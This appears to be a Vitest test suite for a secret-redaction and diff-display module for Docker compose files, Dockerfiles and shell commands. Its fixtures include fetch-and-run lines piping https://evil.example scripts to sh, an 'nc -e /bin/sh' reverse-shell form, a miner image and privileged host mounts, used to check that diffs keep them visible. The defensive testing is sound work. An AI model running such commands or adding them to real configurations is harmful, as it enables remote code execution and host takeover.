import { describe, it, expect } from 'vitest';
import { redactCommandLine, redactDocument, redactDocumentLines } from '../src/client/redact.js';
import { formatRedactedDiff } from '../src/client/compose.js';
import { documentSecrets, sanitizeServerMessage } from '../src/client/base.js';

/**
 * Fourth adversarial review: what the round-3 rewrite broke, and what it hid that it should show.
 * Two kinds of test, on purpose: a secret must not be printed, AND an ordinary file must stay
 * readable — an agent reviews an image bump or a diff with this output.
 */
const S = 's3cr3t-AAAA1111bbbb2222';
const doc = (...lines: string[]): string => lines.join('\n');
const hides = (out: string, secret = S): void => { expect(out).not.toContain(secret); };
const unchanged = (text: string): void => { expect(redactDocument(text)).toBe(text); };

describe('a key is a NAME when it sits directly under a top-level section', () => {
  it('a service called test / command / entrypoint is a service: its environment is redacted', () => {
    for (const name of ['test', 'command', 'entrypoint']) {
      const out = redactDocument(doc('services:', `  ${name}:`, '    image: nginx:1.27', '    environment:', `      POSTGRES_PASSWORD: ${S}`, '    ports:', '      - "80:80"'));
      hides(out);
      expect(out).toContain('image: nginx:1.27');
      expect(out).toContain('- "80:80"');
    }
  });

  it('a service called env / args / environment is not a block of variables', () => {
    for (const name of ['env', 'args', 'environment']) {
      unchanged(doc('services:', `  ${name}:`, '    image: nginx:1.27', '    volumes:', '      - /var/run/docker.sock:/var/run/docker.sock'));
    }
  });

  it('`test:` with a mapping under it is a key like any other', () => {
    hides(redactDocument(doc('    test:', '      environment:', `        DB_PASSWORD: ${S}`)));
    unchanged(doc('    healthcheck:', '      test:', '        - CMD', '        - curl', '        - -f', '        - http://localhost:3000/health', '      interval: 10s'));
  });
});

describe('command lists', () => {
  it('the script body of a `- |` item is ordinary text: its key rules apply', () => {
    const out = redactDocument(doc('    command:', '      - sh', '      - -c', '      - |', '        cat > /app/config.yml <<EOF', `        password: ${S}`, '        EOF', '    image: x'));
    hides(out);
    expect(out).toContain('cat > /app/config.yml <<EOF');
    expect(out).toContain('image: x');
  });

  it('an item is ONE argument: a value with blanks is hidden to its end', () => {
    expect(redactDocument(doc('    command:', '      - redis-server', `      - --requirepass=correct horse ${S}`)))
      .toBe(doc('    command:', '      - redis-server', '      - --requirepass=[REDACTED]'));
    hides(redactDocument(doc('    command:', '      - redis-server', '      - --requirepass', `      - correct horse ${S}`)));
    hides(redactDocument(`      test: ["CMD", "redis-server", "--requirepass=correct horse ${S}"]`));
    hides(redactDocument(`    command: [prog, --requirepass, ${S.replace('-', ' ')} tail]`), 'AAAA1111bbbb2222');
    // …and one that holds a whole command line is still read word by word.
    hides(redactDocument(doc('    command:', `      - redis-server --requirepass ${S}`)));
  });

  it('ordinary arguments stay readable: name=value items, -e, set -e', () => {
    unchanged(doc('    command:', '      - postgres', '      - -c', '      - shared_buffers=256MB', '      - -c', '      - wal_level=replica', '      - -c', '      - config_file=/etc/postgresql/postgresql.conf'));
    unchanged('    command: ["/bin/sh", "-e", "/entrypoint.sh"]');
    unchanged('    entrypoint: sh -c "set -e && npx prisma migrate deploy && node server.js"');
    expect(redactCommandLine("sed -i -e 's/a/b/' file")).toBe("sed -i -e 's/a/b/' file");
    expect(redactCommandLine("mysql -e 'select 1'")).toBe("mysql -e 'select 1'");
    expect(redactCommandLine('nc -e /bin/sh host 80')).toBe('nc -e /bin/sh host 80');
    // docker's -e still sets a variable, whatever the case of its name.
    expect(redactCommandLine(`docker run -e lower=${S} img`)).toBe('docker run -e lower=[REDACTED] img');
  });

  it('a flow list in prettier style, at the indent of its key, with a comment in it', () => {
    hides(redactDocument(doc('    command: [', '    "redis-server",', '    "--requirepass",', `    "${S}"`, '    ]', '    image: x')));
    const commented = redactDocument(doc('    command: ["redis-server",', '      "--requirepass", # see [1]', `      "${S}"]`, '    image: x'));
    hides(commented);
    expect(commented).toContain('image: x');
  });

  it('redis-cli -aSECRET as a list element, and the value of a flag given as a block scalar', () => {
    hides(redactDocument(`      test: ["CMD", "redis-cli", "-a${S}", "ping"]`));
    hides(redactDocument(doc('      test:', '        - CMD', '        - redis-cli', `        - -a${S}`, '        - ping')));
    hides(redactDocument(doc('    command:', '      - --requirepass', '      - |', `        ${S}`, '    image: x')));
  });
});

describe('command substitutions and glued quotes', () => {
  it('$(…) and backticks are commands of their own', () => {
    expect(redactDocument(`      test: ["CMD-SHELL", "[ $$(redis-cli -a ${S} ping) = PONG ]"]`))
      .toBe('      test: ["CMD-SHELL", "[ $$(redis-cli -a [REDACTED] ping) = PONG ]"]');
    hides(redactCommandLine(`until $(mysqladmin ping --password ${S} --silent); do sleep 1; done`));
    hides(redactCommandLine(`echo \`mysqladmin ping --password ${S}\``));
    hides(redactCommandLine(`echo $(prog --requirepass "s3cr3t)AAAA1111")`), 'AAAA1111');
    expect(redactCommandLine('echo $(date +%s) && ls $(pwd)')).toBe('echo $(date +%s) && ls $(pwd)');
  });

  it('a deeply nested, harmless entrypoint stays readable', () => {
    unchanged(`    entrypoint: bash -c 'eval "echo \\"$$(cat ~/temp.yml)\\"" > ~/kong.yml && /docker-entrypoint.sh kong docker-start'`);
  });

  it('quoted parts glued by the shell are read part by part, a flag carried from one to the next', () => {
    hides(redactCommandLine(`sh -c 'prog '\\''--requirepass=${S}'\\'''`));
    hides(redactCommandLine(`sh -c 'redis-cli -a '\\''${S}'\\'' ping'`));
    hides(redactCommandLine(`sh -c 'redis-cli -a '"'"'${S}'"'"' ping'`));
    hides(redactCommandLine(`curl -H"X-Api-Key: ${S}" http://h`));
  });

  it('a quoted header before a shell operator', () => {
    for (const tail of ['; echo done', '|jq .', '||exit 1', '&& true', ')']) hides(redactCommandLine(`curl -H "X-Api-Key: ${S}"${tail}`));
    hides(redactCommandLine(`curl -sS '--header' 'X-Api-Key: ${S}'|jq .`));
  });

  it('a Bearer header in escaped quotes keeps the rest of the command — a new `| sh` must stay visible', () => {
    const out = redactDocument('    command: sh -c "curl -fsS -H \\"Authorization: Bearer $$API_TOKEN\\" https://evil.example/install.sh | sh"');
    expect(out).toContain('https://evil.example/install.sh | sh"');
    hides(redactDocument(`    command: sh -c "curl -H \\"Authorization: Bearer ${S}\\" https://x"`));
  });

  it('a string in escaped quotes glued to a word, and XML around one', () => {
    hides(redactCommandLine(`sh -c "grep a\\"b f && mysql --password ${S} -e x && grep c\\"d f"`));
    hides(redactCommandLine(`sh -c "x=\\"redis-cli -a ${S} ping\\"; $x"`));
    hides(redactDocument(`  <password>"${S} x"</password>`));
  });

  it('a backslash-newline inside one command string continues the line', () => {
    const out = redactCommandLine(`redis-server --requirepass \\\n  ${S}`);
    hides(out);
    expect(out).toContain('\\\n');
  });

  it('separators and prefixes that are not the value', () => {
    hides(redactCommandLine(`prog --password := ${S}`));
    hides(redactCommandLine(`prog --password: ${S}`));
    hides(redactCommandLine(`export PASSWORD = ${S}`));
    hides(redactCommandLine(`sudo lower=${S} app`));
    hides(redactCommandLine(`exec env -i lower=${S} app`));
    hides(redactCommandLine(`set -e; export Lower_Name=${S}; app`));
    hides(redactCommandLine(`lower+=${S} app`));
  });
});

describe('PEM blocks', () => {
  it('a key in a quoted scalar whose lines sit at column 0', () => {
    const out = redactDocument(doc('      JWT_KEY: "-----BEGIN PRIVATE KEY-----', 'MIIEs3cr3tAAAA1111', 'abcd+/EFGH==', '-----END PRIVATE KEY-----"', '      NEXT: 1'));
    hides(out, 'MIIEs3cr3tAAAA1111');
    hides(out, 'abcd+/EFGH');
    expect(out).toContain('NEXT: 1');
  });

  it('header lines of a key block (PGP, encrypted PEM) belong to it', () => {
    const out = redactDocument(doc('      -----BEGIN PGP PRIVATE KEY BLOCK-----', '      Comment: x', '      Version: 2', '', '      lQOYs3cr3tAAAA1111', '      -----END PGP PRIVATE KEY BLOCK-----', '    image: x'));
    hides(out, 'lQOYs3cr3tAAAA1111');
    hides(out, 'Comment: x');
    expect(out).toContain('image: x');
  });

  it('a marker in a comment hides only the comment lines after it', () => {
    const before = doc('FROM node:24', '# -----BEGIN NOTES-----', '# keep this image small', 'RUN npm ci');
    const after = doc('FROM node:24', '# -----BEGIN NOTES-----', '# keep this image small', 'RUN npm ci', 'RUN curl -s https://evil.example/x.sh | sh', 'USER root');
    const diff = formatRedactedDiff(before, after).join('\n');
    expect(diff).toContain('evil.example/x.sh | sh');
    expect(diff).toContain('USER root');
  });

  it('a marker that is only text ends at the first line that is not base64', () => {
    const out = redactDocument(doc('    labels:', '      - "note=-----BEGIN NOTE-----"', '      - "other=1"', '    privileged: true'));
    expect(out).toContain('- "other=1"');
    expect(out).toContain('privileged: true');
  });
});

describe('what a diff must show', () => {
  it('an env item holding a lone quote does not hide the lines after it', () => {
    const base = ['services:', '  app:', '    image: nginx:1', '    environment:', '      - MOTD="', '      - API_KEY=x'];
    const added = ['    privileged: true', '    network_mode: host', '    cap_add:', '      - SYS_ADMIN', '    volumes:', '      - /var/run/docker.sock:/var/run/docker.sock', '      - /:/host'];
    const diff = formatRedactedDiff(base.join('\n'), [...base, ...added].join('\n')).join('\n');
    for (const line of ['privileged: true', 'network_mode: host', 'SYS_ADMIN', '/var/run/docker.sock:/var/run/docker.sock', '/:/host']) expect(diff, line).toContain(line);
  });

  it('flow-style volumes, devices and security options are shown', () => {
    unchanged('    volumes: ["/var/run/docker.sock:/var/run/docker.sock", "data:/data"]');
    unchanged('    security_opt: ["no-new-privileges:true"]');
    unchanged('    extra_hosts: ["host.docker.internal:host-gateway"]');
  });

  it('a hunk too large to align shows only what changed, and survives 70 000 lines a side', { timeout: 120_000 }, () => {
    const a = Array.from({ length: 2100 }, (_, i) => `    line${i}: v`);
    const b = [...a];
    b[10] = '    image: nginx:2';
    b[1050] = '    privileged: true';
    b[2090] = '    user: root';
    // Make the differing middle too large for the table: 2080 × 2080 > 4M cells.
    const diff = formatRedactedDiff(a.join('\n'), b.join('\n'));
    expect(diff.filter((l) => l.startsWith('~'))).toHaveLength(0);
    expect(diff.filter((l) => l.startsWith('+')).map((l) => l.trim())).toEqual(['+     image: nginx:2', '+     privileged: true', '+     user: root']);
    const big = Array.from({ length: 70_000 }, (_, i) => `a${i}`).join('\n');
    const other = Array.from({ length: 70_000 }, (_, i) => `b${i}`).join('\n');
    expect(() => formatRedactedDiff(big, other)).not.toThrow();
  });
});

describe('ordinary files stay readable', () => {
  it('an upper-case key with a nested mapping does not force its children', () => {
    unchanged(doc('http:', '  routers:', '    API:', '      rule: Host(`api.example.com`)', '      service: api'));
    unchanged(doc('    networks:', '      DMZ:', '        aliases:', '          - web'));
  });

  it('a Dockerfile syntax directive, and comments that hold no secret', () => {
    unchanged('# syntax=docker/dockerfile:1.7');
    unchanged(doc('FROM node:24-alpine AS build', '# install only production dependencies', 'RUN npm ci --omit=dev', 'ENTRYPOINT ["node", "server.js"]'));
  });

  it('a whole compose of the usual kind', () => {
    unchanged(doc(
      'services:',
      '  app:',
      '    image: ghcr.io/acme/app:1.2.3',
      '    build:',
      '      context: .',
      '      dockerfile: Dockerfile',
      '      target: runtime',
      '    command: ["node", "server.js", "--port", "3000"]',
      '    depends_on: [db, cache]',
      '    labels:',
      '      - traefik.enable=true',
      '      - "traefik.http.routers.app.rule=Host(`app.example.com`)"',
      '      - traefik.http.services.app.loadbalancer.server.port=3000',
      '    healthcheck:',
      '      test: ["CMD-SHELL", "wget -qO- http://localhost:3000/health || exit 1"]',
      '      interval: 10s',
      '    deploy:',
      '      resources:',
      '        limits:',
      '          memory: 512M',
      '  db:',
      '    image: postgres:16',
      '    command: postgres -c shared_buffers=256MB -c max_connections=200',
      '    volumes:',
      '      - pgdata:/var/lib/postgresql/data',
      'volumes:',
      '  pgdata:',
    ));
  });
});

describe('sensitive keys: lists at the key\'s indent, comments after the key', () => {
  it('a list at the indent of a sensitive key loses its items', () => {
    hides(redactDocument(doc('api_keys:', `- ${S}`, '- hunter2password', 'name: web')));
    expect(redactDocument(doc('api_keys:', `- ${S}`, 'name: web'))).toContain('name: web');
  });

  it('a comment after a key that opens a block is redacted like any comment', () => {
    hides(redactDocument(doc(`    command: # redis-server --requirepass ${S}`, '      - redis-server')));
    hides(redactDocument(doc(`    API_KEY: # ${S}`, '    image: x')));
    hides(redactDocument(doc(`    API_KEY: | # ${S}`, '      x', '    image: x')));
    hides(redactDocument(doc(`    environment: # was ${S}`, '      - A=b')));
    unchanged(doc('    command: # the server', '      - redis-server'));
  });

  it('a Dockerfile continuation survives CRLF, blank lines and comments inside it', () => {
    hides(redactDocument(`RUN redis-server --requirepass \\\r\n    ${S}\r\nRUN echo done\r\n`));
    hides(redactDocument(doc('RUN redis-server --requirepass \\', '# the password', `    ${S}`)));
    expect(redactDocumentLines(`RUN a \\\r\n    b\r\n`)).toHaveLength(3);
  });
});

describe('server messages', () => {
  it('secrets are removed before the message is cut: a compose echoed whole is itself a secret', () => {
    const compose = JSON.stringify({ services: { db: { image: 'postgres:16', environment: { POSTGRES_PASSWORD: S, PAD: 'x'.repeat(9000) } } } });
    const out = sanitizeServerMessage(`The docker compose raw field is invalid: ${compose}`, documentSecrets(compose));
    hides(out);
    expect(out).toContain('The docker compose raw field is invalid');
  });

  it('a cut through a secret leaves no beginning of it behind', () => {
    const token = `12|${S}${'z'.repeat(40)}`;
    for (const pad of [63_990, 63_999, 64_000, 64_010]) {
      const out = sanitizeServerMessage(`${' '.repeat(pad)}${token} rejected`, [token]);
      expect(out, String(pad)).not.toContain('12|s3cr3t');
    }
  });
});

/** Fifth pass: what the round-4 fixes themselves got wrong. */
describe('fifth pass', () => {
  const Q = "'"; // a single quote, to keep the shell idioms below readable
  const BS = '\\';

  it('a marker that names key material but is only text hides nothing after it', () => {
    const base = ['services:', '  app:', '    image: nginx:1'];
    const added = ['    x-note: -----BEGIN PRIVATE KEY-----', '    image: evil/miner:latest', '    privileged: true', '    pid: host', '    user: root', '    command: sh -c "curl https://evil.example/x.sh | sh"'];
    const diff = formatRedactedDiff(base.join('\n'), [...base.slice(0, 2), ...added].join('\n')).join('\n');
    for (const line of ['evil/miner:latest', 'privileged: true', 'pid: host', 'user: root', 'evil.example/x.sh | sh']) expect(diff, line).toContain(line);
    // Real armor headers still belong to the block.
    hides(redactDocument(doc('  -----BEGIN RSA PRIVATE KEY-----', '  Proc-Type: 4,ENCRYPTED', '  DEK-Info: AES-256-CBC,ABCDEF', '', '  MIIEs3cr3tAAAA1111', '  -----END RSA PRIVATE KEY-----')), 'MIIEs3cr3tAAAA1111');
  });

  it('a quoted part glued after a waiting flag IS its value, blanks included', () => {
    const glue = `${Q}${BS}${Q}${Q}`; // '\''
    const idiom = `${Q}"${Q}"${Q}`; // '"'"'
    hides(redactCommandLine(`sh -c ${Q}curl -H ${glue}X-Api-Key: ${S}${glue} http://h${Q}`));
    hides(redactCommandLine(`sh -c ${Q}curl -H ${idiom}X-Api-Key: ${S}${idiom} http://h${Q}`));
    hides(redactCommandLine(`sh -c ${Q}prog --password ${glue}correct horse ${S}${glue}${Q}`));
    const harmless = `sh -c ${Q}curl -H ${glue}Accept: application/json${glue} http://h${Q}`;
    expect(redactCommandLine(harmless)).toBe(harmless);
  });

  it('a substitution inside double quotes keeps its own quotes', () => {
    hides(redactCommandLine(`echo "$(prog --requirepass "${S}")"`));
    hides(redactCommandLine(`X="$(curl -s -H "X-Api-Key: ${S}" http://h)"`));
    hides(redactDocument(`      test: ["CMD-SHELL", "[ ${BS}"$$(redis-cli -a ${BS}"${S}${BS}" ping)${BS}" = PONG ]"]`));
    const harmless = 'echo "$(date "+%Y-%m-%d")" && echo "done"';
    expect(redactCommandLine(harmless)).toBe(harmless);
  });

  it('the lines that continue an inline command are readable command text', () => {
    unchanged(doc('    command: bash -c "', '      python manage.py migrate &&', '      gunicorn app.wsgi --bind 0.0.0.0:8000', '      "', '    image: x'));
    unchanged(doc('    command: redis-server', '      --appendonly yes', '    image: redis:7'));
    unchanged(doc('      test: curl -f http://localhost:3000/health', '        || exit 1', '      interval: 10s'));
    // …and a flag on one line with its value on the next is still hidden.
    const out = redactDocument(doc('    command: redis-server --requirepass', `      ${S}`, '      --appendonly yes', '    image: redis:7'));
    hides(out);
    expect(out).toContain('--appendonly yes');
    expect(out).toContain('image: redis:7');
    const diff = formatRedactedDiff(doc('    command: bash -c "', '      app"'), doc('    command: bash -c "', '      curl -fsSL https://evil.example/x.sh | sh &&', '      app"')).join('\n');
    expect(diff).toContain('evil.example/x.sh | sh');
  });

  it('a quote inside a plain flow element does not leave the list open', () => {
    const out = redactDocument(doc('    post_start:', `      - command: [sh, -c, echo it${Q}s up]`, '        environment:', `          lower: ${S}`, '    image: x'));
    hides(out);
    expect(out).toContain(`echo it${Q}s up]`);
    unchanged('    command: [echo, 5" disk, ok]');
  });

  it('an anchor or a tag after an upper-case or sensitive-looking key is not a value', () => {
    unchanged(doc('services:', '  DB: &db', '    image: postgres:16', '    restart: always'));
    unchanged(doc('services:', '  passbolt: &p', '    image: passbolt/passbolt:latest'));
    hides(redactDocument(doc('x-credentials: &c', `  password: ${S}`)));
  });

  it('a header glued to its flag and to what follows', () => {
    for (const tail of [';echo', '|jq .', '&&x']) {
      hides(redactCommandLine(`curl -H"X-Api-Key: ${S}"${tail}`));
      hides(redactCommandLine(`curl --header="X-Api-Key: ${S}"${tail}`));
    }
    expect(redactCommandLine('curl -H"Accept: text/plain";echo ok')).toBe('curl -H"Accept: text/plain";echo ok');
  });

  it('a long server message is cut where no secret is split', () => {
    const token = `12|${S}${'z'.repeat(40)}`;
    for (const pad of [63_900, 63_920, 63_960, 63_999, 64_000]) {
      const out = sanitizeServerMessage(`${' '.repeat(pad)}${token}${'y'.repeat(300)}`, [token]);
      expect(out, String(pad)).not.toContain('12|s3cr3t');
    }
    const compose = JSON.stringify({ services: { db: { environment: { POSTGRES_PASSWORD: S, PAD: 'x'.repeat(40_000) } } } });
    hides(sanitizeServerMessage(`invalid: ${compose} ${'t'.repeat(30_000)}`, documentSecrets(compose)));
    hides(sanitizeServerMessage(`invalid: ${'p'.repeat(60_000)}${compose}`, documentSecrets(compose)));
  });
});
